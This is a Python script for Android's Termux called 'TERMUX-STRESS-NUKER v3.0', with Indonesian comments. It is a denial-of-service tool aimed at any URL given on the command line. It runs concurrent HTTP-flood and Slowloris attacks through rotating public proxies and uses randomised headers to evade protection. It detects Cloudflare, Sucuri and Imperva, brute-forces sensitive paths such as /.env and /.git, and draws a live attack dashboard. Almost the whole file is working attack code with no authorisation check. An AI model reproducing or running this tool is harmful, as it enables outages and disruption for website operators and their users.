#!/data/data/com.termux/files/usr/bin/python3
# -*- coding: utf-8 -*-
# TERMUX-STRESS-NUKER v3.0
# Full weaponized stress tool - No Root Required
# Author: XMODS-HACKED

import asyncio
import aiohttp
import random
import sys
import time
import json
import os
import socket
import ipaddress
from concurrent.futures import ThreadPoolExecutor
from datetime import datetime
from collections import Counter
import curses
import urllib.parse
from typing import List, Dict, Optional, Tuple
import dns.resolver
import hashlib

# ==================== CONFIGURATION ====================
class Config:
    MAX_THREADS = 50  # Optimized for Termux
    CONNECTION_TIMEOUT = 15
    REQUEST_TIMEOUT = 30
    SCAN_DEPTH = 3
    USER_AGENTS = [
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15',
        'Mozilla/5.0 (Linux; Android 10) AppleWebKit/537.36',
        'Googlebot/2.1 (+http://www.google.com/bot.html)',
        'curl/7.68.0'
    ]
    COMMON_PATHS = [
        '/admin', '/wp-admin', '/login', '/api', '/v1', '/v2',
        '/dashboard', '/control', '/manager', '/backend',
        '/phpmyadmin', '/mysql', '/config', '/.env', '/.git',
        '/api/v1/users', '/api/auth', '/graphql', '/rest/v1'
    ]
    PROXY_SOURCES = [
        'https://api.proxyscrape.com/v2/?request=getproxies&protocol=http',
        'https://raw.githubusercontent.com/TheSpeedX/SOCKS-List/master/http.txt'
    ]

# ==================== PROTECTION DETECTOR ====================
class ProtectionDetector:
    @staticmethod
    async def detect_waf(session, url: str) -> Dict:
        """Deteksi WAF/Cloudflare"""
        headers = {'User-Agent': random.choice(Config.USER_AGENTS)}
        try:
            async with session.head(url, headers=headers, timeout=10) as resp:
                server = resp.headers.get('Server', '').lower()
                cf_ray = resp.headers.get('CF-RAY')
                sucuri = resp.headers.get('X-Sucuri-ID')
                imperva = resp.headers.get('X-CDN')
                
                return {
                    'cloudflare': cf_ray is not None,
                    'sucuri': sucuri is not None,
                    'imperva': imperva is not None,
                    'server': server,
                    'protected': any([cf_ray, sucuri, imperva])
                }
        except:
            return {'protected': False}

# ==================== ENDPOINT SCANNER ====================
class EndpointScanner:
    def __init__(self, base_url: str):
        self.base_url = base_url.rstrip('/')
        self.found_endpoints = []
        self.vulnerable_endpoints = []
    
    async def crawl(self, session, path: str = '', depth: int = 0):
        """Crawl website untuk cari endpoint"""
        if depth >= Config.SCAN_DEPTH:
            return
        
        url = f"{self.base_url}{path}"
        try:
            async with session.get(url, timeout=10) as resp:
                if resp.status == 200:
                    html = await resp.text()
                    # Cari link
                    import re
                    links = re.findall(r'href=[\'"]?([^\'" >]+)', html)
                    for link in links:
                        if link.startswith('/'):
                            if link not in self.found_endpoints:
                                self.found_endpoints.append(link)
                                await self.crawl(session, link, depth + 1)
        except:
            pass
    
    async def brute_force(self, session):
        """Brute force common paths"""
        tasks = []
        for path in Config.COMMON_PATHS:
            url = f"{self.base_url}{path}"
            task = self.check_endpoint(session, url, path)
            tasks.append(task)
        
        results = await asyncio.gather(*tasks, return_exceptions=True)
        for result in results:
            if isinstance(result, dict) and result['found']:
                self.found_endpoints.append(result['path'])
    
    async def check_endpoint(self, session, url: str, path: str) -> Dict:
        """Check endpoint availability"""
        try:
            async with session.head(url, timeout=5) as resp:
                return {
                    'found': resp.status < 400,
                    'path': path,
                    'status': resp.status
                }
        except:
            return {'found': False}

# ==================== BYPASS ENGINE ====================
class BypassEngine:
    def __init__(self):
        self.proxies = []
        self.current_proxy_index = 0
        self.request_count = 0
    
    async def load_proxies(self):
        """Load proxy list dari sumber"""
        async with aiohttp.ClientSession() as session:
            for source in Config.PROXY_SOURCES:
                try:
                    async with session.get(source, timeout=10) as resp:
                        if resp.status == 200:
                            text = await resp.text()
                            proxies = [p.strip() for p in text.split('\n') if p.strip()]
                            self.proxies.extend(proxies)
                except:
                    continue
        
        # Remove duplicates
        self.proxies = list(set(self.proxies))
        return len(self.proxies)
    
    def get_proxy(self) -> Optional[str]:
        """Get proxy dengan rotation"""
        if not self.proxies:
            return None
        
        self.current_proxy_index = (self.current_proxy_index + 1) % len(self.proxies)
        return self.proxies[self.current_proxy_index]
    
    def generate_headers(self) -> Dict:
        """Generate random headers untuk evasi"""
        self.request_count += 1
        
        headers = {
            'User-Agent': random.choice(Config.USER_AGENTS),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': random.choice(['en-US,en;q=0.9', 'id-ID,id;q=0.8', 'fr-FR,fr;q=0.7']),
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': random.choice(['0', '1']),
            'Connection': random.choice(['keep-alive', 'close', 'upgrade']),
            'Upgrade-Insecure-Requests': '1',
            'Cache-Control': random.choice(['max-age=0', 'no-cache', 'no-store']),
            'Pragma': random.choice(['no-cache', '']),
            'Referer': random.choice(['https://google.com', 'https://facebook.com', self.base_url])
        }
        
        # Tambahkan header random setiap 10 request
        if self.request_count % 10 == 0:
            headers[f'X-Random-{random.randint(1000,9999)}'] = hashlib.md5(str(time.time()).encode()).hexdigest()[:8]
        
        return headers

# ==================== ATTACK ENGINE ====================
class AttackEngine:
    def __init__(self, target_url: str, bypass_engine: BypassEngine):
        self.target_url = target_url
        self.bypass = bypass_engine
        self.stats = {
            'requests_sent': 0,
            'requests_success': 0,
            'requests_failed': 0,
            'bytes_sent': 0,
            'start_time': time.time(),
            'last_update': time.time()
        }
    
    async def http_flood(self, endpoint: str = '/'):
        """HTTP Flood attack"""
        url = f"{self.target_url}{endpoint}"
        
        while True:
            try:
                headers = self.bypass.generate_headers()
                proxy = self.bypass.get_proxy()
                
                connector = aiohttp.TCPConnector(limit=0)
                timeout = aiohttp.ClientTimeout(total=Config.REQUEST_TIMEOUT)
                
                async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                    # Random method
                    method = random.choice(['GET', 'POST', 'HEAD'])
                    
                    if method == 'POST':
                        # Random data
                        data = {f'field_{i}': ''.join(random.choices('abcdefghijklmnopqrstuvwxyz', k=10)) 
                                for i in range(random.randint(5, 20))}
                        async with session.post(url, headers=headers, data=data, proxy=proxy) as resp:
                            await resp.read()
                    else:
                        async with session.request(method, url, headers=headers, proxy=proxy) as resp:
                            await resp.read()
                    
                    self.stats['requests_success'] += 1
                    self.stats['bytes_sent'] += random.randint(500, 5000)
                    
            except Exception as e:
                self.stats['requests_failed'] += 1
            
            finally:
                self.stats['requests_sent'] += 1
                
                # Random delay untuk evasi
                await asyncio.sleep(random.uniform(0.01, 0.5))
    
    async def slowloris(self, endpoint: str = '/'):
        """Slowloris attack"""
        url = f"{self.target_url}{endpoint}"
        
        while True:
            try:
                # Buat koneksi TCP manual
                parsed = urllib.parse.urlparse(url)
                host = parsed.netloc
                port = 80 if parsed.scheme == 'http' else 443
                
                # Connect
                reader, writer = await asyncio.open_connection(host, port)
                
                # Kirim partial request
                request = f"POST {endpoint} HTTP/1.1\r\n"
                request += f"Host: {host}\r\n"
                request += "Content-Length: 1000000\r\n"
                request += "Content-Type: application/x-www-form-urlencoded\r\n"
                
                writer.write(request.encode())
                await writer.drain()
                
                # Keep connection open
                for _ in range(100):
                    writer.write(b"X-a: b\r\n")
                    await writer.drain()
                    await asyncio.sleep(random.uniform(10, 30))
                
                writer.close()
                await writer.wait_closed()
                
            except:
                pass
    
    async def websocket_flood(self, endpoint: str = '/ws'):
        """WebSocket flood (jika tersedia)"""
        url = f"ws://{urllib.parse.urlparse(self.target_url).netloc}{endpoint}"
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.ws_connect(url) as ws:
                    while True:
                        # Kirim random data
                        data = ''.join(random.choices('0123456789abcdef', k=100))
                        await ws.send_str(data)
                        await asyncio.sleep(0.1)
        except:
            pass

# ==================== UI DASHBOARD ====================
class Dashboard:
    def __init__(self):
        self.stdscr = None
        self.stats = {}
        self.endpoints = []
        self.running = True
    
    def init_curses(self):
        """Initialize curses untuk UI"""
        self.stdscr = curses.initscr()
        curses.start_color()
        curses.init_pair(1, curses.COLOR_RED, curses.COLOR_BLACK)
        curses.init_pair(2, curses.COLOR_GREEN, curses.COLOR_BLACK)
        curses.init_pair(3, curses.COLOR_YELLOW, curses.COLOR_BLACK)
        curses.init_pair(4, curses.COLOR_CYAN, curses.COLOR_BLACK)
        curses.noecho()
        curses.cbreak()
        self.stdscr.keypad(True)
        self.stdscr.nodelay(True)
    
    def draw_header(self):
        """Draw header"""
        height, width = self.stdscr.getmaxyx()
        
        # Title
        title = " TERMUX-STRESS-NUKER v3.0 "
        self.stdscr.addstr(0, (width - len(title)) // 2, title, curses.A_BOLD | curses.A_REVERSE)
        
        # Status
        status = f"[ACTIVE] Target: {self.stats.get('target', 'N/A')}"
        self.stdscr.addstr(1, 2, status, curses.color_pair(2))
        
        # Time running
        runtime = time.time() - self.stats.get('start_time', time.time())
        time_str = f"Runtime: {int(runtime // 3600):02d}:{int((runtime % 3600) // 60):02d}:{int(runtime % 60):02d}"
        self.stdscr.addstr(1, width - len(time_str) - 2, time_str, curses.color_pair(4))
    
    def draw_stats(self):
        """Draw statistics"""
        row = 3
        
        # Requests stats
        self.stdscr.addstr(row, 2, "═" * 50, curses.color_pair(4))
        row += 1
        
        self.stdscr.addstr(row, 2, "REQUESTS STATISTICS:", curses.A_BOLD)
        row += 2
        
        total = self.stats.get('requests_sent', 0)
        success = self.stats.get('requests_success', 0)
        failed = self.stats.get('requests_failed', 0)
        
        # Calculate percentages
        success_pct = (success / total * 100) if total > 0 else 0
        failed_pct = (failed / total * 100) if total > 0 else 0
        
        # Bar chart
        bar_width = 40
        success_bar = int(bar_width * success_pct / 100)
        failed_bar = int(bar_width * failed_pct / 100)
        
        self.stdscr.addstr(row, 2, f"Total: {total:,}", curses.color_pair(4))
        row += 1
        
        self.stdscr.addstr(row, 2, f"Success: {success:,} [{success_pct:.1f}%] ", curses.color_pair(2))
        self.stdscr.addstr(f"[{'█' * success_bar}{'░' * (bar_width - success_bar)}]")
        row += 1
        
        self.stdscr.addstr(row, 2, f"Failed:  {failed:,} [{failed_pct:.1f}%] ", curses.color_pair(1))
        self.stdscr.addstr(f"[{'█' * failed_bar}{'░' * (bar_width - failed_bar)}]")
        row += 2
        
        # RPS
        elapsed = time.time() - self.stats.get('last_update', time.time())
        if elapsed > 0:
            rps = (total - self.stats.get('last_total', 0)) / elapsed
            self.stdscr.addstr(row, 2, f"Requests/sec: {rps:.1f}", curses.color_pair(3))
            row += 1
        
        # Bytes sent
        bytes_sent = self.stats.get('bytes_sent', 0)
        mb_sent = bytes_sent / (1024 * 1024)
        self.stdscr.addstr(row, 2, f"Data sent: {mb_sent:.2f} MB", curses.color_pair(4))
        row += 2
        
        # Endpoints found
        self.stdscr.addstr(row, 2, "═" * 50, curses.color_pair(4))
        row += 1
        
        self.stdscr.addstr(row, 2, "ENDPOINTS FOUND:", curses.A_BOLD)
        row += 2
        
        endpoints = self.endpoints[:10]  # Show first 10
        for i, endpoint in enumerate(endpoints):
            if row >= curses.LINES - 5:
                break
            self.stdscr.addstr(row, 4, f"• {endpoint[:50]}", curses.color_pair(3))
            row += 1
        
        if len(self.endpoints) > 10:
            self.stdscr.addstr(row, 4, f"... and {len(self.endpoints) - 10} more", curses.color_pair(4))
            row += 1
    
    def draw_footer(self):
        """Draw footer dengan controls"""
        height, width = self.stdscr.getmaxyx()
        
        footer = " [Q]uit | [P]ause | [S]can more | [B]ypass reload "
        self.stdscr.addstr(height - 2, (width - len(footer)) // 2, footer, curses.A_REVERSE)
        
        # Key status
        keys = f"Proxies: {self.stats.get('proxies', 0)} | Threads: {self.stats.get('threads', 0)}"
        self.stdscr.addstr(height - 1, 2, keys, curses.color_pair(4))
        
        # Attack mode
        mode = self.stats.get('mode', 'MIXED')
        self.stdscr.addstr(height - 1, width - len(mode) - 2, mode, curses.color_pair(1) | curses.A_BOLD)
    
    def update(self, stats: Dict, endpoints: List):
        """Update dashboard"""
        if not self.stdscr:
            self.init_curses()
        
        self.stats.update(stats)
        self.endpoints = endpoints
        
        self.stdscr.clear()
        self.draw_header()
        self.draw_stats()
        self.draw_footer()
        self.stdscr.refresh()
    
    def cleanup(self):
        """Cleanup curses"""
        if self.stdscr:
            curses.nocbreak()
            self.stdscr.keypad(False)
            curses.echo()
            curses.endwin()

# ==================== MAIN ENGINE ====================
class TermuxStressNuker:
    def __init__(self, target_url: str):
        self.target_url = target_url.rstrip('/')
        self.bypass_engine = BypassEngine()
        self.attack_engine = None
        self.scanner = EndpointScanner(target_url)
        self.detector = ProtectionDetector()
        self.dashboard = Dashboard()
        self.running = False
        self.paused = False
        
        # Attack tasks
        self.tasks = []
        self.endpoints = ['/']  # Default endpoint
        
        # Statistics
        self.stats = {
            'target': target_url,
            'requests_sent': 0,
            'requests_success': 0,
            'requests_failed': 0,
            'bytes_sent': 0,
            'start_time': time.time(),
            'last_update': time.time(),
            'last_total': 0,
            'proxies': 0,
            'threads': 0,
            'mode': 'MIXED'
        }
    
    async def initialize(self):
        """Initialize semua sistem"""
        print("[*] Initializing Termux-Stress-Nuker...")
        
        # Load proxies
        print("[*] Loading proxies...")
        proxy_count = await self.bypass_engine.load_proxies()
        self.stats['proxies'] = proxy_count
        print(f"[+] Loaded {proxy_count} proxies")
        
        # Detect protection
        print("[*] Detecting protection...")
        async with aiohttp.ClientSession() as session:
            protection = await self.detector.detect_waf(session, self.target_url)
            if protection['protected']:
                print(f"[!] Protection detected: {protection}")
            else:
                print("[+] No major protection detected")
        
        # Scan endpoints
        print("[*] Scanning endpoints...")
        async with aiohttp.ClientSession() as session:
            await self.scanner.brute_force(session)
            await self.scanner.crawl(session)
        
        self.endpoints = self.scanner.found_endpoints
        if not self.endpoints:
            self.endpoints = ['/']
        
        print(f"[+] Found {len(self.endpoints)} endpoints")
        for endpoint in self.endpoints[:5]:
            print(f"    • {endpoint}")
        
        # Initialize attack engine
        self.attack_engine = AttackEngine(self.target_url, self.bypass_engine)
        
        print("[+] Initialization complete!")
        print("[+] Press any key to start attack...")
        input()
    
    async def start_attack(self):
        """Start semua attack vector"""
        self.running = True
        print("[*] Starting attack...")
        
        # Start HTTP Flood tasks
        for _ in range(Config.MAX_THREADS // 2):
            endpoint = random.choice(self.endpoints)
            task = asyncio.create_task(self.attack_engine.http_flood(endpoint))
            self.tasks.append(task)
        
        # Start Slowloris tasks
        for _ in range(Config.MAX_THREADS // 4):
            endpoint = random.choice(self.endpoints)
            task = asyncio.create_task(self.attack_engine.slowloris(endpoint))
            self.tasks.append(task)
        
        self.stats['threads'] = len(self.tasks)
        print(f"[+] Started {len(self.tasks)} attack threads")
    
    async def update_dashboard(self):
        """Update dashboard secara real-time"""
        while self.running:
            if not self.paused:
                # Update stats dari attack engine
                if self.attack_engine:
                    self.stats.update(self.attack_engine.stats)
                
                # Update dashboard
                self.dashboard.update(self.stats, self.endpoints)
            
            # Check for keypress
            try:
                key = self.dashboard.stdscr.getch()
                if key != -1:
                    await self.handle_keypress(key)
            except:
                pass
            
            await asyncio.sleep(0.5)
    
    async def handle_keypress(self, key: int):
        """Handle user input"""
        if key in [ord('q'), ord('Q')]:
            self.running = False
            print("\n[*] Shutting down...")
        elif key in [ord('p'), ord('P')]:
            self.paused = not self.paused
            status = "PAUSED" if self.paused else "RESUMED"
            print(f"\n[*] Attack {status}")
        elif key in [ord('s'), ord('S')]:
            print("\n[*] Rescanning endpoints...")
            async with aiohttp.ClientSession() as session:
                await self.scanner.brute_force(session)
            self.endpoints = self.scanner.found_endpoints
        elif key in [ord('b'), ord('B')]:
            print("\n[*] Reloading proxies...")
            await self.bypass_engine.load_proxies()
    
    async def run(self):
        """Main execution loop"""
        try:
            await self.initialize()
            await self.start_attack()
            
            # Start dashboard update task
            dashboard_task = asyncio.create_task(self.update_dashboard())
            
            # Keep running
            while self.running:
                await asyncio.sleep(1)
                
                # Update stats
                self.stats['last_update'] = time.time()
                self.stats['last_total'] = self.stats['requests_sent']
            
            # Cleanup
            dashboard_task.cancel()
            for task in self.tasks:
                task.cancel()
            
            await asyncio.gather(*self.tasks, return_exceptions=True)
            
        except KeyboardInterrupt:
            print("\n[*] Interrupted by user")
        except Exception as e:
            print(f"\n[!] Error: {e}")
        finally:
            self.dashboard.cleanup()
            
            # Save stats
            self.save_statistics()
            
            print(f"\n[+] Attack completed")
            print(f"[+] Total requests: {self.stats['requests_sent']:,}")
            print(f"[+] Success rate: {(self.stats['requests_success']/self.stats['requests_sent']*100 if self.stats['requests_sent'] > 0 else 0):.1f}%")
            print("[+] Clean exit")
    
    def save_statistics(self):
        """Save statistics ke file"""
        filename = f"attack_{int(time.time())}.json"
        stats = {
            'target': self.target_url,
            'duration': time.time() - self.stats['start_time'],
            'total_requests': self.stats['requests_sent'],
            'successful_requests': self.stats['requests_success'],
            'failed_requests': self.stats['requests_failed'],
            'data_sent_mb': self.stats['bytes_sent'] / (1024 * 1024),
            'endpoints_found': self.endpoints,
            'timestamp': datetime.now().isoformat()
        }
        
        with open(filename, 'w') as f:
            json.dump(stats, f, indent=2)
        
        print(f"[+] Statistics saved to {filename}")

# ==================== INSTALLATION & USAGE ====================
def check_dependencies():
    """Check dan install dependencies"""
    import subprocess
    import sys
    
    dependencies = [
        'aiohttp',
        'curses',
        'dnspython'
    ]
    
    print("[*] Checking dependencies...")
    
    for dep in dependencies:
        try:
            if dep == 'curses':
                import curses
            elif dep == 'dnspython':
                import dns.resolver
            else:
                __import__(dep)
            print(f"[+] {dep}: OK")
        except ImportError:
            print(f"[!] {dep}: MISSING")
            print(f"[*] Installing {dep}...")
            subprocess.check_call([sys.executable, "-m", "pip", "install", dep])
            print(f"[+] {dep}: INSTALLED")

def show_banner():
    """Show banner"""
    banner = """
    ╔══════════════════════════════════════════════════════════╗
    ║    TERMUX-STRESS-NUKER v3.0 - Advanced Website Stress    ║
    ║                   No Root Required                       ║
    ║                Auto-Scan & Bypass Engine                 ║
    ║                 XMODS-HACKED Edition                     ║
    ╚══════════════════════════════════════════════════════════╝
    """
    print(banner)

# ==================== MAIN ====================
async def main():
    if len(sys.argv) < 2:
        print("Usage: python3 stress_nuker.py <target_url>")
        print("Example: python3 stress_nuker.py https://example.com")
        sys.exit(1)
    
    target_url = sys.argv[1]
    
    # Validate URL
    if not target_url.startswith(('http://', 'https://')):
        target_url = 'https://' + target_url
    
    show_banner()
    check_dependencies()
    
    # Create instance
    nuker = TermuxStressNuker(target_url)
    
    # Run
    await nuker.run()

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except KeyboardInterrupt:
        print("\n\n[*] Terminated by user")
        sys.exit(0)
